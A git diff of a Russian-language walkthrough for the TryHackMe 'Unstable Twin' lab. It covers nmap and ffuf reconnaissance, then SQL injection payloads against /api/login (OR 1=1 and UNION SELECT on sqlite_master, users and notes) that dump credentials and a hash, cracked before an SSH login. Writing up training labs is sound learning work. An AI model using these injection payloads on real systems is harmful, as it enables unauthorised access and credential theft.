@@ -26,42 +26,54 @@ sudo nmap -sC -sV -v 10.113.189.121
 
 ![Результаты сканирования Nmap](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%821.PNG)
 
-При переходе по IP-адресу в браузере отдается ошибка **404 NOT FOUND**. Поскольку корень сайта пуст, начинаем фаззить директории с помощью `ffuf`:
+При переходе по IP-адресу в браузере отдается ошибка **404 NOT FOUND**.
+![скрин сайта](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%822.PNG)
+
+Поскольку корень сайта пуст, начинаем фаззить директории с помощью `ffuf`:
 
 ```bash
 ffuf -w /home/user/fuzz.txt -u "http://10.113.189.121/FUZZ" -ic -c
 ```
 
-В результатах фаззинга находим директорию `/info`, при переходе в которую сервер выдает сообщение: 
+В результатах фаззинга находим директорию `/info`
+![фаззинг](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%823.PNG)
+
+При переходе в найденную директорию сервер выдает сообщение: 
 > *"API needs to be called with the username and password form fields fields. It has not been fully tested yet so may not be full developed and secure"*
 
-![Скриншот ответа /info](images/ffuf_info.png)
+![Скриншот ответа /info](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%824.PNG)
 
 ---
 
 ## 2. Поиск и подтверждение SQL-инъекции
 
-Отправляем POST-запрос на эндпоинт `/api/login`. При передаче неверных данных сервер возвращает сообщение об ошибке: `"The username or password is not correct."`
+При анализе эндпоинта `/api/login` было замечено аномальное поведение: **один и тот же POST-запрос обрабатывается сервером по-разному**. 
 
-![Скриншот ответа с ошибкой](images/burp_login_error.png)
+В первом случае (при отправке `username=test&password=test`) сервер возвращает статус `200 OK`, заголовок `Content-Length: 3` и пустой JSON-массив `[]`:
 
-Замечаем, что при передаче разных данных сервер отвечает по-разному. Это указывает на возможную уязвимость. Пробуем классическую SQL-инъекцию с оператором `OR 1=1`:
+![Скриншот пустого ответа](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%827.PNG)
+
+Однако при отправке точно такого же запроса во второй раз сервер возвращает `200 OK`, но уже с другим заголовком `Content-Length: 51` и конкретным сообщением об ошибке: `"The username or password passed are not correct."`
+
+![Скриншот ответа с ошибкой](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%826.PNG)
+
+**Вывод:** мы видим, что запросы обрабатываются разными компонентами (два сервиса за балансировщиком или микросервисная архитектура) либо имеют разное состояние. Такая неконсистентность (Differential) в ответах на идентичные запросы является явным признаком того, что за логикой стоит база данных, а значит, высока вероятность наличия SQL-инъекции.
+
+Пробуем классическую SQL-инъекцию с оператором `OR 1=1`:
 
 ```text
 username=test'+or+1=1+--+&password=test
 ```
 
-Сервер успешно возвращает список пользователей (Julius, Linda, Marnie и др.), что подтверждает наличие SQL-инъекции.
+Сервер успешно возвращает список пользователей (Julius, Linda, Marnie и др.), что окончательно подтверждает наличие уязвимости.
 
-![Скриншот успешной инъекции](images/burp_sqli_success.png)
-
----
+![Скриншот успешной инъекции](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%8219.PNG)
 
 ## 3. Эксплуатация: извлечение данных из БД
 
 Определяем количество колонок в запросе. При попытке вывести 3 колонки сервер выдает ошибку **500 Internal Server Error**, а при 2 — успешно отрабатывает. Значит, в запросе **2 колонки**.
 
-![Скриншот ошибки при 3 колонках](images/burp_sqli_columns.png)
+![Скриншот ошибки при 3 колонках](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%82%208_1.PNG)
 
 БД — SQLite. Вытаскиваем список таблиц из системной таблицы `sqlite_master`:
 
@@ -70,7 +82,7 @@ username=test'+UNION+SELECT+1,name+FROM+sqlite_master+WHERE+type='table'--+-&pas
 ```
 Получаем таблицы: `notes`, `sqlite_sequence`, `users`.
 
-![Скриншот списка таблиц](images/burp_sqli_tables.png)
+![Скриншот списка таблиц](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%828.PNG)
 
 ### Шаг 3.1: Изучение структуры и дамп данных
 
@@ -80,7 +92,7 @@ username=test'+UNION+SELECT+1,name+FROM+sqlite_master+WHERE+type='table'--+-&pas
 username=test'+UNION+SELECT+1,sql+FROM+sqlite_master+WHERE+name='users'--+-&password=test
 ```
 
-![Скриншот структуры таблицы users](images/burp_sqli_users_schema.png)
+![Скриншот структуры таблицы users](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%829.PNG)
 
 Вытаскиваем логины и пароли пользователей:
 
@@ -90,7 +102,7 @@ username=test'+UNION+SELECT+username,password+FROM+users--+&password=test
 
 Получаем учетные данные (Julius:Red, Linda:Green, Marnie:Yellow, Mary_ann:Continue, Vincent:Orange).
 
-![Скриншот дампа пользователей](images/burp_sqli_users_dump.png)
+![Скриншот дампа пользователей](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%8210.PNG)
 
 ### Шаг 3.2: Чтение заметок
 
@@ -103,9 +115,11 @@ username=test'+UNION+SELECT+user_id,notes+FROM+notes--+&password=test
 Находим заметку от Mary Ann, в которой сказано: 
 > *"My Password is eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b3c4b099e66efe25ecca607c47dd99c43b0c01af669c90f6a14933422cf98432f645b84427343f4a11"*
 
+![пароль](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%8211.PNG)
+
 Используя **CrackStation**, расшифровываем хэш. Пароль — **Experiment**.
 
-![Скриншот заметок](images/burp_sqli_notes.png)
+![Скриншот заметок](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%8212.PNG)
 
 ---
 
@@ -117,8 +131,11 @@ username=test'+UNION+SELECT+user_id,notes+FROM+notes--+&password=test
 ssh mary_ann@10.113.189.121
 # Пароль: Experiment
 ```
+![первый_флаг](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%8213.PNG)
 
 Заходим на сервер, получаем первый флаг и читаем заметки на сервере.
+
+![заметки на сервере](https://github.com/koo-noo/my-write-up/blob/main/labs/try_hack_me/unstable_twin/images/%D0%BE%D1%82%D1%87%D0%B5%D1%8214.PNG)
 
 Далее переходим по ссылке в браузере: `http://10.113.189.121/get_image?name=marnie` (на скриншоте изображены две женщины). Скачиваем картинку и проверяем её на наличие скрытых данных с помощью **steghide**:
 
